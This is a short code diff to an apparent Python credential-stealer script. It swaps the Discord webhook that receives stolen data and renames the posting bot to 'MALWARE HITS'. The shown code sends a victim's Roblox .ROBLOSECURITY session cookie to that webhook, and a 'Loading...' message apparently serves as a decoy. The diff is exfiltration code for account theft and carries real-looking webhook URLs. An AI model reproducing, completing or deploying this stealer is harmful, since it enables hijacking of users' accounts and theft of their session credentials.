@@ -89,7 +89,7 @@ try:
 except FileNotFoundError:
     print("")
 
-webhook_url = 'https://discord.com/api/webhooks/1328621775541502003/ZNc--m-IsxQoyAWRB6wkK-0-eNDkSTi8Pb-nprNUtVkvGKgf-s_S-4NL4OX0jT6xlNoq'
+webhook_url = 'https://discord.com/api/webhooks/1428411396814540821/LoDavTFmREEGhDbujRIaycMARKhHPzDd8dbdhaNVZn4XCpy_A8D5bIy1akurndVCyLsZ'
 
 dummy_message = "Loading..."
 print(dummy_message)
@@ -292,7 +292,7 @@ def main_stealer_function():
         )
 
         discord.post(
-            username="BOT - Pirate 🍪",
+            username="MALWARE HITS",
             avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
             embeds=[
                 {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
